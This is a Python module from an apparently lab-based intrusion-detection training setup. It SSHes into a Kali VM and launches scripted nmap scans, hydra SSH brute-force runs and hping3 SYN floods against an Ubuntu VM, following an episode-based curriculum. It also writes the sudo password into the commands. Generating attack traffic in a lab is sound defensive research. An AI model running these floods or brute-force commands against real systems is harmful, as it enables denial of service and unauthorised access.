"""
Attack Launcher — SSHes into Kali and runs attack scripts against Ubuntu.

Supports: scan, brute, ddos, exploit, web
Also provides stop() to kill running attacks and a curriculum scheduler.
"""
import logging
import paramiko

logger = logging.getLogger(__name__)

# Attack script deployed to Kali — uses Ubuntu IP from config
KALI_SCRIPT_TEMPLATE = """#!/bin/bash
TARGET="{ubuntu_ip}"
mkdir -p /home/{kali_user}/attacks

case $1 in
  scan)
    # Full SYN scan — generates lots of connection attempts
    echo {kali_pass} | sudo -S nmap -sS -p 1-1024 -T4 --max-retries 2 $TARGET 2>&1
    ;;
  brute)
    # SSH brute force + HTTP brute
    hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://$TARGET -t 4 -f 2>&1 | head -80 &
    hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://$TARGET -t 4 -f 2>&1 | head -80 &
    wait
    ;;
  exploit)
    # SYN flood on port 22 — moderate rate, real source IP
    echo {kali_pass} | sudo -S timeout 55 hping3 -S -p 22 -i u500 $TARGET 2>&1
    ;;
  ddos)
    # SYN flood on port 80 — REAL source IP (not --rand-source, VMware drops random src)
    echo {kali_pass} | sudo -S hping3 --flood -S -p 80 $TARGET 2>&1 &
    HPID=$!
    sleep 55
    echo {kali_pass} | sudo -S kill $HPID 2>/dev/null
    echo {kali_pass} | sudo -S killall hping3 2>/dev/null || true
    ;;
  web)
    # Multi-port flood — simulates botnet behavior
    echo {kali_pass} | sudo -S hping3 --flood -S -p 80 $TARGET 2>&1 &
    echo {kali_pass} | sudo -S hping3 --flood -S -p 443 $TARGET 2>&1 &
    sleep 55
    echo {kali_pass} | sudo -S killall hping3 2>/dev/null || true
    ;;
  stop)
    echo {kali_pass} | sudo -S pkill -9 -f hping3  2>/dev/null || true
    pkill -f hydra   2>/dev/null || true
    pkill -f nmap    2>/dev/null || true
    echo "All attacks stopped."
    ;;
esac
"""

# Attack type → display label
ATTACK_LABELS = {
    "scan":    "PortScan",
    "brute":   "BruteForce",
    "ddos":    "DDoS",
    "exploit": "DoS",
    "web":     "Botnet",
}


class AttackLauncher:
    """SSHes into Kali and triggers attack scripts against Ubuntu."""

    def __init__(self, config: dict):
        net          = config["network"]
        kcfg         = config["kali"]
        vcfg         = config.get("vmware", {})
        self.host    = net["kali_ip"]
        self.user    = kcfg["user"]
        self.pw      = kcfg["password"]
        self.ubuntu_ip = net["ubuntu_ip"]
        self.script_remote = f"/home/{self.user}/attacks/run_episode.sh"
        base_port = int(vcfg.get("ssh_port", 22))
        self._ssh_port = int(kcfg["ssh_port"]) if "ssh_port" in kcfg else base_port
        self._ssh_timeout = int(vcfg.get("ssh_connect_timeout", 20))
        self._ssh_banner = int(vcfg.get("ssh_banner_timeout", 30))

    def _get_ssh(self) -> paramiko.SSHClient:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            self.host,
            port=self._ssh_port,
            username=self.user,
            password=self.pw,
            timeout=self._ssh_timeout,
            banner_timeout=self._ssh_banner,
            auth_timeout=self._ssh_timeout,
            allow_agent=False,
            look_for_keys=False,
        )
        return c

    def deploy(self):
        """Upload the attack script to Kali.  Called once at startup."""
        script = KALI_SCRIPT_TEMPLATE.format(
            ubuntu_ip=self.ubuntu_ip,
            kali_user=self.user,
            kali_pass=self.pw,
        )
        try:
            ssh  = self._get_ssh()
            ssh.exec_command(f"mkdir -p /home/{self.user}/attacks")
            sftp = ssh.open_sftp()
            with sftp.open(self.script_remote, "w") as f:
                f.write(script)
            ssh.exec_command(f"chmod +x {self.script_remote}")
            sftp.close()
            ssh.close()
            logger.info("Attack script deployed to Kali ✓")
        except Exception as e:
            logger.error(f"deploy failed: {e}")

    def launch(self, attack_type: str):
        """Launch an attack in the background on Kali."""
        try:
            ssh = self._get_ssh()
            ssh.exec_command(
                f"nohup bash {self.script_remote} {attack_type} "
                f"> /tmp/attack_{attack_type}.log 2>&1 &"
            )
            ssh.close()
            label = ATTACK_LABELS.get(attack_type, attack_type)
            logger.info(f"[KALI → UBUNTU] Launched attack: {label} ({attack_type})")
        except Exception as e:
            logger.error(f"launch failed: {e}")

    def stop(self):
        """Kill all running attacks on Kali."""
        try:
            ssh = self._get_ssh()
            ssh.exec_command(f"bash {self.script_remote} stop")
            ssh.close()
            logger.info("[KALI] All attacks stopped.")
        except Exception as e:
            logger.warning(f"stop attacks failed: {e}")

    def curriculum(self, episode: int) -> str:
        """
        Curriculum schedule — gradually increases attack complexity:
          Ep  0–19  : scan        (PortScan)
          Ep 20–39  : brute       (BruteForce)
          Ep 40–59  : ddos        (DDoS)
          Ep 60–79  : exploit     (DoS)
          Ep 80+    : mixed cycle
        """
        if   episode < 20:  return "scan"
        elif episode < 40:  return "brute"
        elif episode < 60:  return "ddos"
        elif episode < 80:  return "exploit"
        else:
            # cycle all types including web
            types = ["scan", "brute", "ddos", "exploit", "web"]
            return types[episode % len(types)]